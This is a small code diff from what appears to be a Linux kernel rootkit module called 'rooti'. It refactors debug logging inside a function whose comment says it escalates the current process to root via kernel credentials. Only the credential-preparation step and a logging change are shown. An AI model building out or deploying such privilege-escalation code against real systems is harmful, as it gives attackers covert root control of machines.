@@ -1,5 +1,6 @@
 #include <linux/cred.h>
 #include "privilege.h"
+#include "../utils.h"
 
 /*
     Escalates the privilege of the current process in execution to root user & group.
@@ -10,7 +11,7 @@ int rooti_elevate_privilege()
     // Prepare new set of credentials
     struct cred *creds = prepare_creds();
     if (creds == NULL) {
-        printk(KERN_DEBUG "rooti: prepare_creds() failed, out of memory\n");
+        ROOTI_DEBUG("prepare_creds() failed, out of memory");
         return -ENOMEM;
     }
 
